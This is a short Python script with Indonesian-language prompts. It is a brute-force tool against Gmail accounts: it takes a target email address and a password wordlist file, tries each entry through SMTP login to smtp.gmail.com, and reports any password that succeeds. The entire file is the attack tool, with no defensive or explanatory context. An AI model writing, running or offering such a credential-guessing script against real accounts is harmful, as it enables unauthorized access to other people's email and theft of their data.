import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Masukan Alamat Email: ")
passwfile = input("Masukan password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)
		print ("[+] password ditemukan: %s " %password) 
		break;
	except smtplib.SMTPAuthenticationError:
		print ("[!] password tidak ditemukan %s " %password)
